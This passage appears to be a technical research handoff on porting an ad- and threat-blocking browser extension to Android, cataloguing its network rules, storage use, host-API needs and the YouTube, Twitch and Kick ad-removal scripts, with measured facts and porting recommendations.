Not checked: WebView document-start injection and GeckoView content scripts on the phone. The legacy mirrors exist only for old DNR code; an Android host can read settings directly but update.js still asks deps.enabled() and deps.threatEnabled(). |
| allow-rules | Allow rules (Allow this site, Allow this domain, list-download allow, stream-site allows) | declarativeNetRequest.getDynamicRules / updateDynamicRules: Allow this site ids 900000 to 909999 (priority 10,000, initiatorDomains, 12 types, max 10,000); Allow this domain ids 950000 to 950999 (priority 2,000,020, requestDomains, 15 types, max 1,000); list-download allow id 990001 (priority 3,000,000, initiatorDomains = extension id, requestDomains = 8 list hosts plus a configured feed host); storage.local + storage.onChanged: threatAllowDomains, generalAllowedOrigins; runtime.id: initiator of the list-download allow rule; static ruleset general ids 1 to 3: stream-site allows at 2,000,000 (allowAllRequests for 5 hosts, allow twitch.tv except ads.twitch.tv, allow 7 CDN hosts) | Initiator-aware matching for Allow this site: Chrome matches the origin of the requesting frame (and its subdomains), not the tab. A requestDomains allow layer above the threat layer. The list-download allow is not necessary if the app downloads lists outside the filtered path. Frame-tree context for allowAllRequests. | Checked: buildUserAllowRules and userDomainReason in threat/compile.js are pure (URL only for IDN). listAllowRule in update.js is pure. buildAllowRules and syncAllowRules sit in general-background.js; the rule-build part is about 40 lines of pure code that a port must copy. | A DNS or VPN blocker has no initiator, so Allow this site can only become a global or per-app exception. In a WebView browser the initiator must come from the Referer or Origin header or from the top page URL (UNVERIFIED accuracy). Checked: in QuickJS without URL an IDN domain is refused (fail-closed). |
| toolbar-icon-tab-signals | Toolbar icon and tab signals (guard dot, popup messages) | action.setIcon / setTitle: working or off icon from generalEnabled; action.setBadgeBackgroundColor / setBadgeText / getBadgeText: magenta dot for the tab where a page guard blocked an action; storage.session get/set: tabSignals, last guard event for 50 tabs maximum; runtime.onMessage with sender.id, sender.tab.id, sender.documentId, sender.url: guardEvent, tabSignal, cosmeticCss, applyGeneralState, updateLists, revertLists, siteInfo | Per-tab UI state in the browser UI. A message channel from page scripts to the engine with a trusted sender identity (tab id, document id, extension-page check). Burst coalescing (2 s for each document). A session store that is empty after an app restart. | No part runs as is: the logic is small (about 150 lines) but bound to chrome.action, chrome.storage.session and the sender object. A host must write it again. | Android has no extension toolbar badge; map the state to a browser-UI chip, a notification or a Quick Settings tile. Not checked: action and badge display in Firefox for Android. A WebView JavaScript bridge is visible to page code, so the guardEvent sender trust needs a new design. |

Key facts:

- Q1 (checked): only src/general-background.js calls chrome.*. The 16 modules that it loads with one importScripts call have no chrome.* call in code; the 7 hits are comments.
- Q1 (checked): 8 modules use ECMAScript only: general/filter-options.js, general/never-block-captcha.js, threat/psl.js, threat/protected-hosts.js, feed/config.js, feed/keys.js, feed/schema.js, feed/compile.js. Each module sets its global through (self or globalThis), so it loads in any engine with globalThis.
- Q1 (checked): host APIs the other modules need: URL (settings/features.js, general-settings.js, threat/compile.js IDN path, general/cosmetic-parse.js IDN path, general/update.js, feed/client.js); TextDecoder (update.js, feed/canonical.js, feed/verify.js, feed/client.js); TextEncoder (client.js); atob and btoa (canonical.js); crypto.subtle Ed25519 importKey and verify (verify.js) and SHA-256 digest (client.js); setTimeout and clearTimeout (update.js, client.js); AbortController (optional). fetch is injected through deps.
- Q1 (checked): QuickJS (quickjs-emscripten 0.31.0, WASM build) has no URL, TextDecoder, TextEncoder, atob, btoa, crypto, fetch, setTimeout, AbortController or structuredClone. All 16 modules load. Pure calls work: parseEntriesFull, buildListRules, protectedReason, suffixReason, resolve, userDomainReason for ASCII input.
- Q1 (checked): in QuickJS without polyfills, isListUrl returns false (each list download is refused), an IDN domain is refused, base64ToBytes throws ReferenceError (atob), and checkFeedBytes rejects each feed (no TextDecoder). These failures are fail-closed or loud.
- Q1 (checked): in Node 22 the 16 modules load in a bare vm context that has only URL, TextEncoder, TextDecoder, atob, btoa and crypto. Bytes from another realm fail 'instanceof Uint8Array' in feed/canonical.js.
- Q1 (checked, this container): parse time of all 8 lists in Deno is 409 ms. EasyPrivacy (1.5 MB): 91 ms in Deno, 183 ms in a Node vm context, 1,027 ms in QuickJS-WASM; parse plus rule build 1,835 ms in QuickJS-WASM. Not measured: native QuickJS, Hermes or a WebView on a phone CPU.
- Q2 (checked): declarativeNetRequest calls in the worker: updateDynamicRules (list swap, allow rules, threat rules, list-download allow), getDynamicRules (id reads before writes), updateEnabledRulesets (rulesets general and threat), getSessionRules and updateSessionRules (feed). All DNR writes go through dnrExclusive (one section at a time, 120 s backstop).
- Q2 (checked): storage calls: storage.local get, set, remove, getBytesInUse (listDataPresent); storage.session get and set (tabSignals); storage.onChanged (settings, siteOverrides, generalEnabled, generalAllowedOrigins, threatAllowDomains, feedPaused).
- Q2 (checked): alarms.create, alarms.get, alarms.onAlarm (gecko-refresh 180 min period, first delay 5 to 30 min; gecko-refresh-retry 31 min one-shot). action.setIcon, setTitle, setBadgeBackgroundColor, setBadgeText, getBadgeText. runtime.getURL (8 uses: packaged JSON, CSS, settings page URL), runtime.getManifest (version, host_permissions, content_scripts), runtime.id, runtime.lastError (30 uses), runtime.onMessage, onInstalled, onStartup. Global fetch for list hosts, the feed host and packaged files.
- Q3 (checked): static ruleset general: 2,856 rules (ids 1 to 4 and 100 to 2951), 213,508 requestDomains entries, 80 hosts maximum for each rule. 2,852 priority-1 block rules (2,851 list rules and extra tracker rule 2951 with 3 hosts); ids 1 to 3 are stream-site allows at 2,000,000 (1 allowAllRequests for main_frame and sub_frame, 2 allow); id 4 blocks doubleclick from YouTube initiators at 2,000,001. Condition keys: requestDomains 2,856, resourceTypes 263, initiatorDomains 153, domainType 48 (44 thirdParty, 4 firstParty), excludedResourceTypes 9, excludedRequestDomains 1. 201 rules list main_frame.
- Q3 (checked): static ruleset ubo-youtube: 4 block rules at 2,000,011 with urlFilter (2), regexFilter (1), requestMethods (1), excludedInitiatorDomains (1), domainType (2). Static ruleset threat: 199 block rules at 2,000,010, 15,865 hosts, all with the same 8 resource types. These 3 rules are the only urlFilter and regexFilter rules in the extension.
- Q3 (checked): dynamic rules after a fresh-install refresh of the 2026-11-17 lists: 3,058 rules = 2,853 list rules (100000+) + 5 kept bundled rules (800000+) + 199 threat rules (600000+) + 1 list-download allow (990001); 229,539 requestDomains entries; condition keys requestDomains, resourceTypes 463, initiatorDomains 154, domainType 48, excludedResourceTypes 9, excludedRequestDomains 1. filter-options.js keyToCondition can also emit excludedInitiatorDomains, requestMethods, excludedRequestMethods and excludedRequestDomains.
- Q3 (checked): id ranges and priorities: list 100000+ (1), Allow this site 900000 to 909999 (10,000), kept copies 800000+ (same as source), threat refresh 600000 to 609999 (2,000,010), feed session 700001 to 704500 (2,000,010), Allow this domain 950000 to 950999 (2,000,020), list-download allow 990001 (3,000,000). Code limits: MAX_LIST_RULES 25,000, DYNAMIC_RULE_LIMIT 30,000.
- Q3 (checked, Chrome docs and MDN data): MAX_NUMBER_OF_DYNAMIC_RULES 30,000, MAX_NUMBER_OF_SESSION_RULES 5,000, MAX_NUMBER_OF_REGEX_RULES 1,000, GUARANTEED_MINIMUM_STATIC_RULES 30,000, enabled static rulesets 50. isUrlFilterCaseSensitive defaults to false (since Chrome 118) and applies to urlFilter and regexFilter. domainType uses eTLD+1. requestDomains matches subdomains. In one extension, allow and allowAllRequests come before block at equal priority.
- Q3 (checked): host-only share of the packed list rules: 2,440 rules (195,072 entries) have only requestDomains; 212 rules (16,086 entries) add only resourceTypes; 200 rules (2,336 entries) add initiator, party or excluded fields. 14,475 of the 15,865 threat hosts are also host-only list entries.
- Q4 (checked): test/fixtures/dnr-matcher.js is 5,064 bytes of plain ES module code that uses only URL and RegExp; 11 files in test/ reference it. It covers requestDomains, excluded and initiator domains, resourceTypes defaults with the excluded-only main_frame quirk, domainType, requestMethods, regexFilter, simple urlFilter (||, |, ^, *), priority, allow > allowAllRequests > block, and allowAllRequests inheritance through a frame chain.
- Q4 (checked): it is not a full DNR matcher. Gaps: domainType compares the last two labels, not eTLD+1 (a.co.uk and b.co.uk count as one site); regexFilter is case-sensitive although Chrome's default is case-insensitive; isUrlFilterCaseSensitive is ignored; no rulesets, enable state, id uniqueness or atomic updates; any other action (redirect, upgradeScheme, modifyHeaders) is reported as allow; frame documents are synthetic https://host/ URLs; no tabIds, no opaque or null initiators, no IDN normalization, no index.
- Q4 (checked): speed is 13.2 ms for each non-matching request over 3,060 rules and 229,375 domain entries (linear scan, Deno, this container). A production matcher needs a host-suffix hash index. Not checked by a build: a Kotlin port of the logic is about 100 lines; psl.js data can supply eTLD+1 (registrableDomain).
- Q5 (checked): 8 list hosts, HTTPS only: pgl.yoyo.org, malware-filter.gitlab.io, easylist.to, ublockorigin.github.io, easylist-downloads.adblockplus.org, secure.fanboy.co.nz, raw.githubusercontent.com (2 repository paths in the manifest), filters.adtidy.org (/extension/ublock/ only). Only EasyList and EasyPrivacy have mirrors (3 each).
- Q5 (checked): formats: Adblock Plus syntax '||host^' with '$options', '@@||host^' exceptions, hosts-file lines ('0.0.0.0 host', '127.0.0.1 host'), bare domain lines, '! Expires:' header (12 h to 7 days, default 24 h), cosmetic '##' and '#@#' lines (EasyList and EasyPrivacy only). PARSER_VERSION is 5.
- Q5 (checked): limits: body 16 MB, timeout 90 s with the body, minDomains per list (50 to 10,000), size change 25 % maximum (confirm within 10 % on the next download), protected stream hosts 25 (HaGeZi adaptive, seed 64), generic hide selectors 30,000, whole-page hide rules 100, new threat hosts 2,500 and 20 %, refreshed set not below 50 % of the packed set, 12 h throttle after success, 30 min after a failure.
- Q5 (checked, 2026-11-17 downloads): total 11,227,375 bytes: adguard_base 4,382,224; hagezi_pro_mini 2,481,561; easylist 2,039,012; easyprivacy 1,517,795; dandelion_antimalware 444,310; ublock_badware 274,891; peter_lowe 70,506; urlhaus_hosts 17,076. filters.adtidy.org reset one connection; a retry worked.
- Q6 (checked, fake Chrome worker that counts key length plus JSON length, 2026-11-17 lists): peak 8,161,018 bytes, equal to the final size, 8,566 keys. listData:* 7,163,775 bytes (hagezi_pro_mini 2,377,836; easylist 1,869,354; easyprivacy 1,207,975; dandelion_antimalware 1,018,846; adguard_base 426,155; ublock_badware 184,051; peter_lowe 66,186; urlhaus_hosts 13,372).
- Q6 (checked): hide-rule keys 994,174 bytes: cosS:<host> 555,356 (7,842 keys), cosG 222,147, cosKeys 190,471, cosE:<host> 22,374 (523 keys), cosNoG:<host> 3,760 (182 keys), cosMeta 66. Small keys: listState 2,516, settings 295, feedState 119, the others below 60 bytes each. tabSignals (session) holds 50 tabs maximum.
- Q6 (checked): quota of chrome.storage.local 10,485,760 bytes, no unlimitedStorage. Test limit 9,000,000. Worst-case feedCache 1,402,200 bytes (two base64 copies of 512 KB plus 4,096), so peak plus feed cache is 9,563,218 bytes. The previous record was 8,155,204 bytes (2026-11-16, HANDOFF.md). Not checked: Chrome's own byte count.
- Q7 (checked): feed state: FEED_ORIGIN is an empty string, FEED_KEYS and KILL_KEYS are empty, the manifest has no feed host, so configured() returns 'no feed host set' and the client contacts nothing. A port needs Ed25519, SHA-256, a session-rule layer, the app version, a manifest-like host_permissions object, and threat-snapshot.json (199 entries, 15,865 hosts, 333,354 bytes).
- Android (checked, Android docs): WebResourceRequest has only getMethod, getRequestHeaders, getUrl, hasGesture, isForMainFrame (API 21) and isRedirect (API 24). It has no resource type and no initiator frame.
- Android (checked, MDN browser-compat-data): Firefox has declarativeNetRequest from 113 and domainType from 128; Firefox for Android mirrors desktop. Ed25519 in WebCrypto: Chrome 137, Chrome for Android, Android WebView and Samsung Internet mirror Chrome; Firefox 129 (Android mirrors); Safari 17.
- Not checked: Chrome for Android runs no extensions; Firefox MV3 backgrounds use background scripts, not a service worker, so importScripts needs a change; Android WorkManager minimum periodic interval is 15 min; Ed25519 in the Android Java crypto providers by API level; Samsung Internet add-ons cannot load a custom DNR extension; GeckoView embedding limits for built-in extensions.
- Checked: the repository has no change (git status is empty). All measurements ran on a git-archive copy of HEAD in the scratchpad. UNVERIFIED: all behaviour on the owner's phone; the phone model is not known.

Recommendations:

- Keep the 16 importScripts modules unchanged as one shared engine core. Replace only src/general-background.js with an Android host adapter that implements the two dependency contracts: listDeps (comment above refresh() in src/general/update.js) and feedDeps (src/feed/client.js). Do not fork the parse, merge, threat and feed logic.
- For the first working prototype with the most capabilities, use Firefox for Android (or a GeckoView app with a built-in extension). It has real declarativeNetRequest (113+, domainType 128+) and Ed25519 WebCrypto (129+), so the rule files and most of the worker can stay. Expected change: background.scripts instead of service_worker and importScripts, and a check of storage.session, alarms and action support. UNVERIFIED on the phone.
- For system-wide blocking in all apps, add a second path: a local VpnService or DNS filter that uses host-only sets. It covers 195,072 list hosts and 15,865 threat hosts exactly. It cannot express the 18,422 scoped entries, Allow this site by initiator, the stream-site frame allows or cosmetic hiding. Document that a DNS block also blocks navigation and images, which DNR does not do.
- If you build an own WebView browser, write a Kotlin rule store and matcher. Port the semantics of test/fixtures/dnr-matcher.js and fix its gaps: eTLD+1 from the psl.js data, case-insensitive urlFilter and regexFilter, a host-suffix hash index, three layers with ruleset on/off, atomic updates with a unique-id check, and the priority table in ARCHITECTURE.md section 4. Get the resource type from the Accept or Sec-Fetch-Dest header and the initiator from Referer or Origin (UNVERIFIED that WebView sends them for each request).
- Use the JavaScript tests as a conformance suite for a Kotlin matcher: export the request and expected-action vectors from the 11 test files that use dnr-matcher.js, and run the same vectors against the Kotlin code.
- To run the JS engine in a native app, either use a hidden WebView context (it has URL, TextDecoder and Ed25519 WebCrypto on WebView 137+) or QuickJS or Hermes with polyfills for URL, TextEncoder, TextDecoder, atob, btoa, setTimeout, clearTimeout, a fetch that returns a Response-like object with headers.get and body.getReader, and crypto.subtle Ed25519 and SHA-256 bridged to Kotlin. Create byte arrays inside the engine realm, because canonical.js uses instanceof Uint8Array.
- Keep the serial write queue (dnrExclusive) as a single-thread executor for each rule write, with downloads outside it. Map the gecko-refresh alarm (180 min) and the retry (31 min) to WorkManager with a network constraint; keep the 12 h throttle in the engine (shouldRun).
- Replace chrome.storage.local with Room, SQLite or files, but keep the key names and the listState and listData:<name> split. The 10 MB quota does not apply to a native app, but keep the measured peak (8,161,018 bytes) as a budget check for the engine.
- Keep the signed feed dormant in the prototype. For a later Android host, give deps.manifest() a host_permissions array (or change configured()), use the app versionName as the extension version, and keep session rules in memory so that applyCached() fills them at each app start.
- Replace the toolbar icon and the guard dot with an Android UI element (browser chip, notification or Quick Settings tile). Design a trusted channel for guardEvent, because a WebView JavaScript bridge is visible to page code.
- The next session can reuse the measurement scripts (session scratchpad, can be cleared): (a scratch file of the research session) (storage and rule counts), (a scratch file of the research session) (feed client with fake deps), (a scratch file of the research session) (matcher speed and cases), (a scratch file of the research session) (QuickJS load test). They read a git-archive copy of HEAD and the lists downloaded on 2026-11-17.
- Mark each Android claim UNVERIFIED until a run on the owner's phone. Ask the owner for the phone brand, model and Android version first, because Samsung-only options and the WebView version change the plan.

### Site scripts (YouTube, Twitch, Kick, flag channel)

Capabilities:

| Id | Name | Chrome APIs | What a host must give | Portable as is | Android risks |
|---|---|---|---|---|---|
| yt-ubo-main | YouTube layer 1a: uBlock Origin scriptlets in the MAIN world (manifest entry CS-2) | None (checked: no chrome.* or browser.* call in the file). The uBO logger opens a BroadcastChannel only when scriptletGlobals.bcSecret is set. This bundle never sets it (checked). | World: MAIN. Frames: top frame only (all_frames false). Hosts: www.youtube.com, m.youtube.com, youtube.com (manifest matches). The code also selects its calls by location.hostname, so other hosts get nothing (checked). Timing: document start, before the first page script. The set-constant traps on ytInitialPlayerResponse must exist before the inline script sets it. The JSON.parse, fetch and XMLHttpRequest patches must exist before the player code captures or calls them (checked in code). Order: it must run before src/youtube.js in the same frame. It sets globalThis[Symbol.for("gk.u")] = true at its end, and src/youtube.js reads that marker (checked). Page APIs patched on www.youtube.com (26 calls, 24 active): JSON.parse (Proxy), window.fetch (several Proxy layers: json-prune-fetch-response, trusted-replace-fetch-response), XMLHttpRequest (the constructor is replaced by a subclass that overrides open, response and responseText), JSON.stringify (Proxy, trusted-edit-inbound-object on attestation requests), setTimeout (Proxy, nano-stb: [native code] 17000 ms x 0.001), Object.defineProperty traps on ytInitialPlayerResponse.adPlacements/adSlots/playerAds and playerResponse.adPlacements, Function.prototype.toString (Proxy, by proxyApplyFn). Node.prototype.appendChild (prevent-dom-bypass) is off by default (checked). On m.youtube.com (9 calls): JSON.parse prune, fetch prune for /resolve_url and /reel_watch_sequence, fetch JSON edit for /get_watch (adSlotRenderer), and 4 set-constant traps. There is no XHR, JSON.stringify or setTimeout patch on m (checked). Response.prototype.json, Worker and MediaSource are not patched (checked). JS features: private class fields, static class fields, Proxy, static Response.json (checked in code; engine minimum not checked). The host must inject the code itself, not as an inline <script> element, so that page CSP and Trusted Types do not apply. | The whole file can run unchanged in any Chromium or Gecko page context. It reads only location.hostname and standard page APIs (checked). Android WebView: run it with addDocumentStartJavaScript or addJavaScriptOnEvent(INJECTION_EVENT_DOCUMENT_START) in the page world, registered before src/youtube.js (the API runs scripts in the order of registration, checked in the androidx.webkit docs). GeckoView: the manifest entry with world MAIN works in Firefox 128 and later (checked in the Mozilla blog; behaviour in GeckoView not checked). | On a phone, YouTube serves m.youtube.com. That host gets only 9 of 36 MAIN calls and no player XHR or player fetch prune (checked). Mobile player ads then depend on the JSON.parse prune and the set-constant traps. It is not checked if that removes all mobile player ads. The bundle was generated for env 'chromium' (checked in meta). On Gecko, some uAssets filters that are only for Firefox are not in the bundle (not checked). A host that injects after the first page script misses the traps, and ads stay. A desktop user agent makes YouTube serve www.youtube.com with the full 26-call set (not checked). |
| yt-ubo-isolated | YouTube layer 1b: uBlock Origin replace-node-text in the ISOLATED world (manifest entry CS-3, script part) | None (checked). It uses the ISOLATED world only to hide its MutationObserver from the page. | World: ISOLATED (preferred). Frames: top only. Hosts: the manifest matches www, m and bare youtube.com, but the code has calls only for www.youtube.com (2 calls; rmnt is off by default, so 1 call is active: rpnt) (checked). Timing: document start. It installs a MutationObserver on document before the parser inserts the inline script that matches /serverContract\|js_ld/ and /(function serverContract()\|^if (window.ytcsi)/. It rewrites the text of that script one time (sedCount 1) and stops at readyState interactive (checked). The code that it puts into the page script patches Map.prototype.has, Array.prototype.push and Promise.prototype.then, edits ytcfg.data_.INNERTUBE_CONTEXT.client.userAgent, and calls movie_player.loadVideoById and seekTo (checked). It makes a Trusted Types policy with a random name when script.textContent needs a TrustedScript (checked). | The file uses no world-only API, so it can run unchanged in an isolated world or in the page world (checked). Android WebView: androidx.webkit 1.16.0 (May 2026) adds named execution worlds (getExecutionWorld, addJavaScriptOnEvent with INJECTION_EVENT_DOCUMENT_START, feature JS_INJECTION_IN_FRAME_AND_WORLD) 'to prevent collisions with existing page JavaScript' (checked in the release notes and reference). It is not checked whether a WebView world sees parser-inserted scripts early enough. GeckoView: a normal content script (not checked in GeckoView). | It does nothing on m.youtube.com (checked). In a page-world-only host, the page can see the observer, and YouTube's Trusted Types policy rules may refuse the random policy name. Then the rewrite fails (not checked). If the host injects after the parser inserts the target inline script, the rewrite does not occur. |
| yt-css | YouTube layer 1c: hide sheets (manifest CSS of CS-3) | None in code. Chrome injects the files through the content_scripts css key (checked in manifest.json). | Inject 41 rules (1 in ubo-youtube.css, 40 in youtube-ads.css, checked) into the top frame of www, m and bare youtube.com at document start. The browser engine must support :has() (Chromium 105 or later, Firefox 121 or later; not checked now). The sheet must not be blocked by the page CSP style-src. One rule (html[data-ta-yterr] #movie_player .ytp-error) works only with src/youtube.js, which sets that attribute (checked). Mobile selectors: ytm-promoted-sparkles-web-renderer, ytm-ad-slot-renderer, ytm-rich-item-renderer > ad-slot-renderer, lazy-list > ad-slot-renderer (4 of 40 rules, checked). All other rules name desktop ytd-* elements, #masthead-ad, or desktop toasts. The rule in ubo-youtube.css (#toast:has(...)) is a desktop toast rule (checked). | The CSS text is portable. GeckoView: the manifest css key works as in Chrome (not checked). Android WebView has no CSS injection API (not checked). A document-start script must add the text as a <style> element or as a constructed stylesheet in document.adoptedStyleSheets. | A script-inserted <style> is visible to the page and the page can remove it. The script must wait until document.documentElement exists (the WebView docs say the DOM 'might not be ready' at document start, checked). A page CSP style-src can block a script-inserted <style> (YouTube CSP not checked). Mobile coverage is small (4 rules). |
| yt-dnr | YouTube layer 1d: static network rules (ruleset ubo-youtube) | declarativeNetRequest (static ruleset 'ubo-youtube', enabled in manifest.json) | 4 block rules, priority 2000011 (checked): (1) request domain ads.youtube.com, except when the initiator is ads.youtube.com. (2) xmlhttprequest from initiator youtube.com to \|\|googlevideo.com/initplayback?source=youtube&*c=tvhtml5&*oad=. (3) GET xmlhttprequest, third-party, initiator www.youtube.com, regex .googlevideo.com/videoplayback?expire=<window>& (the decoy-stream rule; the window moves with time, see docs/youtube-expire-window.md). (4) media requests whose URL contains _ad_, initiator youtube.com, third-party, except hcaptcha.com. A host needs a request filter that sees URL, method, initiator and resource type, and that can fail a request. src/youtube.js treats a failed decoy fetch or an HTTP 403 as a decoy (checked). | GeckoView: the JSON is DNR format, and a built-in extension can load it (Firefox DNR support not checked now). Android WebView has no DNR. The 4 rules must be re-written in WebViewClient.shouldInterceptRequest. | WebView shouldInterceptRequest gives URL, method, request headers and the main-frame flag, but no resource type and no initiator field (not checked, from memory). A blocked request becomes an HTTP response, not a network error (not checked). Rule 3 names initiator www.youtube.com only, so it has no effect on m.youtube.com (checked). The expire window can go stale; the generator handles it (docs/youtube-expire-window.md, read in part). |
| yt-adgecko-main | YouTube layer 2: src/youtube.js (MAIN world, manifest entry CS-4) | None (checked). Feature switches arrive only on the gk-p1 MessagePort. | World: MAIN. Frames: top only. Hosts: www, m and bare youtube.com. kindFor() accepts www.youtube.com, m.youtube.com, youtube.com and youtubei.googleapis.com (checked). Timing: document start, after src/vendor/ubo-youtube.js. HOOKS is computed one time at start: when the uBO marker is present (the normal case) the script installs no fetch, XHR, JSON.parse or toString hook (checked). Without the marker it patches: window.fetch (Proxy, toString cloaked), XMLHttpRequest.prototype.open and .send (Proxy), XMLHttpRequest.prototype.responseText and .response getters (Object.defineProperty), JSON.parse (Proxy), Function.prototype.toString (Proxy), and accessors for window.ytInitialPlayerResponse and window.ytInitialData (Object.defineProperty). These must exist before the first page script. Object.assign hook (assignHook) and the SABR/UMP body rewrite with TransformStream (umpBackoff) are off (checked). Worker and MediaSource are not patched (checked). Always active: capture-phase document listeners (playing, loadstart, error, timeupdate, progress, loadeddata, canplay, waiting, seeking, yt-navigate-start, yt-navigate-finish, DOMContentLoaded), a PerformanceObserver on resource timing (read only), a MutationObserver on #movie_player children (error-flash guard), the attribute data-ta-yterr on <html>, a 'Blocking ads' notice div, and player API calls (loadVideoById, getVideoData, getPlayerState, getCurrentTime, getPlayerResponse, playVideo, video.play). Under the uBO marker the document-wide MutationObserver and the home-feed <style> are off (checked). Mobile code: DOM_AD_SELECTORS has ytm-companion-ad-renderer and ytm-promoted-sparkles-web-renderer. HOME_FEED_AD_CSS has ytm-promoted-sparkles-web-renderer and ytm-ad-slot-renderer (checked). There is no separate code path for the mobile player (checked). | The file runs unchanged in any page context. It uses only standard APIs (Proxy, WeakMap, MessageEvent getters, PerformanceObserver, requestIdleCallback with a requestAnimationFrame fallback). With no gk-p1 port it keeps youtubeWatchdog and youtubeCosmetic on (checked). | Navigation: the script listens only to yt-navigate-start and yt-navigate-finish (checked). m.youtube.com sends state-navigateend on window instead (checked in SponsorBlock's maze-utils source, not on a live page). On m.youtube.com, under the uBO marker, the stall watchdog is armed only by yt-navigate-finish or by decoy and media-failure paths, so it seldom arms. The per-video state does not reset between videos, and the error-flash guard starts only on the first /watch load (checked in code; effect on a live phone not checked). playerRoot() uses #movie_player first. A third-party userscript uses #movie_player on m.youtube.com too (checked in that script, not on a live page). This file is not frozen, so a state-navigateend listener can be added later with the owner's normal review. |
| twitch-player | Twitch ad blocking: TwitchAdSolutions video-swap-new v1.55 (MAIN world, manifest entry CS-1, frozen) | None. The script only tests typeof chrome !== 'undefined' in its visibilitychange handler, to replay a muted, paused video when the tab becomes visible again (checked). Chrome's page world has a window.chrome object. Android WebView page world: not checked. Firefox/GeckoView page world: no chrome object (not checked), so that one step does not run. | World: MAIN. Frames: all frames (all_frames true). Hosts: twitch.tv and *.twitch.tv, so m.twitch.tv, player.twitch.tv and other subdomains match (checked). Timing: document start, before the first page script. Patches in the page (checked): window.Worker becomes a subclass (class Worker extends the clean native Worker) and is fixed with Object.defineProperty(window, 'Worker', {get, set}) (not configurable; a setter refuses conflicting workers). window.fetch is replaced (plain function, not cloaked); window.realFetch keeps the native one. localStorage.setItem/getItem are wrapped (Firefox refuses this; the script then uses a fallback). document.visibilityState, hidden and webkitHidden (or mozHidden) are redefined, and visibilitychange events are blocked in the capture phase. Worker injection (checked): when the page creates a Worker whose URL origin ends with '.twitch.tv' (the player's blob: worker), the script builds a new blob: worker. The new code reads the original worker source with a synchronous XMLHttpRequest to the original blob URL, eval()s it after its own code, and replaces the worker's global fetch. Inside the worker it rewrites every .m3u8 response and every /channel/hls/ (usher) request. Ad handling (checked): when a media playlist contains 'stitched-ad', the worker asks the page (postMessage FetchRequest) to POST a PlaybackAccessToken GQL query to https://gql.twitch.tv/gql with player types autoplay (platform android), picture-by-picture and embed. Then it fetches https://usher.ttvnw.net/api/[v2/]channel/hls/<channel>.m3u8 with that token and the media playlist of the nearest resolution, and uses the first backup without the marker (the last one even with the marker). It also strips ad segments (EXTINF without ',live'), answers cached ad segment URLs with a small data: MP4 (cache 120 s), removes #EXT-X-TWITCH-PREFETCH during ads, replaces ad click/tracking URLs, re-polls the main playlist, fetches one ad .ts per playlist while on backup, and reloads the player through React internals when the ads end. In the page, its fetch hook rewrites PlaybackAccessToken playerType to 'popout', empties picture-by-picture token bodies, and forwards Device-ID, Client-Integrity and Authorization headers to the worker. Host must allow: blob: Worker creation, synchronous XHR to a blob: URL inside a dedicated worker, eval inside that worker (the worker inherits the page CSP), fetch inside the worker to usher.ttvnw.net and segment hosts, fetch of data: URLs inside the worker, worker/page postMessage, page fetch to gql.twitch.tv with page cookies, and DOM storage (localStorage). | The file needs no extension API, and it was written as a userscript (@run-at document-start, @inject-into page, checked). It can run byte-for-byte in any engine that injects page-world code at document start. Android WebView uses the same Chromium engine, so the worker technique is expected to work (not checked). The upstream comments name Firefox paths, for example the localStorage fallback (checked). A Firefox for Android add-on (KEKW Blocker) states that it uses the same player-worker method (checked in its store listing only). | m.twitch.tv: no code checks the host except the worker origin test, and m.twitch.tv passes that test (checked). It is not checked whether m.twitch.tv uses the same blob: player worker. getPlayerAndState() needs the desktop React tree (#root, setPlayerActive, mediaPlayerInstance, setSrc, setInitialPlaybackSettings) (checked). If m.twitch.tv has a different tree, the reload back to the main stream fails and the backup stream stays (not checked). The visibility override keeps the page 'visible' when the app goes to the background; Android can still pause the WebView (not checked). The frozen file cannot change, so a desktop user agent for twitch.tv is the fallback if m.twitch.tv fails. |
| twitch-directory | Twitch directory ads (ISOLATED world, manifest entry CS-6) | chrome.storage.local.get; chrome.storage.onChanged.addListener; chrome.runtime.lastError; All are only in watchSwitch(). Without GeckoFeatures or chrome.storage it returns, and the switch twitchDisplay stays on (checked). src/settings/features.js has no chrome.* call (checked by search). | World: ISOLATED (any world works). Frames: top only. Hosts: twitch.tv and *.twitch.tv (the code also checks the host, checked). Timing: document start is preferred to avoid a flash; it does not need to run before page scripts. It patches no page API. It adds <style id="gk-t1"> that hides [data-a-target="browse-banner-ad-slot"], [aria-label="Advertisement"] and button[aria-label="Leave feedback for this Ad"]. On '/', '/directory' and '/directory/*' a MutationObserver sweep (at most one in 250 ms) hides the card around each ad feedback button (checked). | Runs unchanged without chrome.* (switch stays on). In an isolated world it is unchanged. In the page world it leaks the globals installTwitchDirectoryAds, startTwitchDirectoryAds, watchSwitch and GeckoFeatures, because the file has no IIFE (checked). Wrap it in an IIFE when a host injects it into the page world. | It appends the style to (document.documentElement \|\| document.head \|\| document) (checked). If a host runs it before <html> exists, the <style> becomes the document root element, and the page can break (not checked for WebView; the WebView docs say the DOM might not be ready at document start). The selectors come from desktop Twitch; m.twitch.tv markup is not checked. |
| kick | Kick ads: src/kick.js (MAIN world, manifest entry CS-5, frozen) | None (checked). The switch 'kick' arrives only on the gk-p1 port. | World: MAIN. Frames: all frames. Hosts: kick.com and *.kick.com; the code also checks the host (checked). Timing: document start, before the first page script. Patches (checked): window.Worker is replaced by a plain wrapper function (prototype copied). It watches only workers whose URL contains 'amazon-ivs-wasmworker' (the IVS player worker). It reads the worker messages PlayerAdBreakStarted, PlayerAdBreakEnded and PlayerTimeUpdate, and it posts {id, funcName: 'seekTo' \| 'skipAd', args} into that worker. window.datazoom gets an accessor (Object.defineProperty). It wraps datazoom.mediatailor (accessor), mediatailor.createSession, and the session's addEventListener/removeEventListener, to read targetPlayheadForAdSkip from event.detail. Limits: at most 2 skips in 60 s, an 8 s hold, and no seek that rewinds more than 120 s or to under 5 s from more than 30 s (checked). It also adds one <style> that hides 8 ad-chrome selectors (one is ad-learn-more-mobile) and 3 banner selectors (#consolidated_header, #native_feed_ad, google_ads_iframe frames). A MutationObserver (scheduled with requestAnimationFrame) hides a post-roll cover and mutes/pauses its clips only when every video in it is an ad clip (checked). | Runs unchanged in any page context at document start. It needs no extension API. With no port, kickOn stays true (checked). | injectChromeCss() runs at start and on a flag change only. If document.head and document.documentElement do not exist yet, it returns without the style and does not try again (checked). A WebView document-start script can meet that case (not checked). The IVS worker message names and the datazoom SDK are private Kick/IVS interfaces and can change (not checked). The code comments mark the live Kick behaviour UNVERIFIED (checked). Kick mobile web layout is not checked. |
